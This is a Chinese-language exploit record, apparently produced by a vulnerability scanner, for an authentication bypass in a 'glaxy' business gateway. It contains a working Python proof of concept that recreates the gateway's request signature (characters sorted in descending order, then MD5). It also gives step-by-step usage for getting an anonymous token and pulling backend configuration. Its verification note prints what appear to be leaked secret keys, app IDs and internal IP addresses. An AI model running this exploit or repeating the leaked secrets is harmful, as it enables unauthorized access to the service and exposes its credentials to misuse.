# glaxy 业务网关签名复现（E=字符降序）+ 匿名未授权读取后端配置/密钥/内网IP

- **code**: glaxy-业务网关签名复现-e-字符降序-匿名未授权读取后端配置-密钥-内网ip
- **kind**: exp
- **category**: auth-bypass
- **component**: glaxy 业务网关 (tus5r4)
- **versions**: apiNameSpace _glaxy_tus5r4_ / _glaxy_live 系列网关
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com 实测：POST /_glaxy_tus5r4_/webToken (appid=d13c1a3202fc4fc88e0c1a37e1dc6632, E=字符降序) → errCode=0000 签发匿名 token；携该 token 打 POST /_glaxy_tus5r4_/club/proxy uri=/club/init → errCode=0000 明文返回 cryptoKey=63^rt(#)F*Ukg49GK04GB_I09$KG_$4g、secretKey=Cl$xcx9@#sms88a3oPXhCah32kpMpeAqEyWC^wyd5pub、uploadUrl=https://example.com；uri=/club/config/query/CLUB_IP_LIST → 0000 返回内网 IP 203.0.113.106/203.0.113.108/203.0.113.105/203.0.113.109/203.0.113.107。对照：E 改回纯倒序/升序均得 GW_880102，证明差异确在 E 函数。user 数据接口(getBalance/myBillsList/admin.team.members)在 loginName 放请求体顶层后返回 CLUB_401 Unauthorized，说明用户数据有真实鉴权、不可匿名读。
- **path**: pocs/glaxy-业务网关签名复现-e-字符降序-匿名未授权读取后端配置-密钥-内网ip/poc_glaxy_auth_bypass.py
- **tags**: 签名绕过,字符降序,未授权访问,glaxy网关,appid泄露,越权
- **created_at**: 2026-10-03T06:10:04.143Z
- **found_by**: vuln-scan

## 描述

glaxy 业务网关（apiNameSpace 形如 _glaxy_xxxx_）签名复现与匿名未授权访问。前序把 E 函数误读为纯倒序 s[::-1] 导致 18 种变体全 GW_880102；实为「字符降序」sorted().reverse()。lgclub 站点匿名 token 可直接读后端密钥与内网 IP。

## 用法

```
# 参数：HOST(example.com)、APPID(lgclub=d13c1a3202fc4fc88e0c1a37e1dc6632 / 主站=dd3b6a3102f54f588e0c8a37e1d96632)、PRODUCT_ID=a80db5262e14467b82d6dec666073364
# 1) POST /_glaxy_tus5r4_/webToken  {productId}  → errCode=0000，target156.example.com=base64({deviceId,u2token,token})
# 2) POST /_glaxy_tus5r4_/club/proxy  {"uri":"/<后端路径>","requestMethod":"GET","productId":...}
#    头带 token + sign(=md5(E(json)+qid+appid+v+token+u2token))
#    → 匿名可读 /club/init(cryptoKey,secretKey,uploadUrl)、/club/config/query/CLUB_IP_LIST(内网IP)、/club/community/list(论坛数据)
# 注意：Qid 是时效 nonce，旧报文重放必得 GW_880102，必须现场重算；间隔 >=3s 否则 openresty 返 400
```

## 正文

```
import json, time, hashlib, random, base64

NS = "_glaxy_tus5r4_"
V = "1.0.0"

def E(s):
    # ★ 关键：E 不是纯倒序 s[::-1]，而是「字符降序」sorted().reverse()
    # 混淆来源：lgclub app.js 里 m.E = q(e){return m(e).sort().reverse().join("")}
    return "".join(sorted(s, reverse=True))

def md5(s):
    return hashlib.md5(s.encode()).hexdigest()

def rand6():
    return "".join(str(int(9*random.random())) for _ in range(6))

def sign_headers(data, domain, appid, token=None, u2token=None):
    qid = md5(str(int(time.time()*1000)) + rand6())   # 时效性 nonce，必须现场重算
    js = json.dumps(data, separators=(",", ":"), ensure_ascii=False)
    tail = (token + (u2token or "")) if token else ""
    sig = md5(E(js) + qid + appid + V + tail)         # token 与 u2token 直接拼接、无分隔符
    h = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json;charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "X-WEBSITE-CODE": "CLUB_H86_PC",              # ★ 缺这个会被拒
        "appId": appid,
        "domainName": domain,
        "needEncrypt": "undefined",
        "orginType": "PC",                            # ★ 缺这个会被拒
        "productId": PRODUCT_ID,
        "qid": qid,
        "sign": sig,
        "v": V,
    }
    if token:
        h["token"] = token
    return h

# Step 1: 取匿名 webToken
r = post(f"/{NS}/webToken", {"productId": PRODUCT_ID}, sign_headers({"productId": PRODUCT_ID}, HOST, APPID))
info = json.loads(base64.b64decode(r["body"]["info"]))   # -> deviceId, u2token, token

# Step 2: 带 token 调 club/proxy（中央路由网关）
payload = {"uri": "/club/init", "requestMethod": "GET", "productId": PRODUCT_ID}
post(f"/{NS}/club/proxy", payload,
     sign_headers(payload, HOST, APPID, info["token"], info["u2token"]))
# -> errCode=0000，明文返回 cryptoKey / secretKey / uploadUrl / 内网 IP 等
```
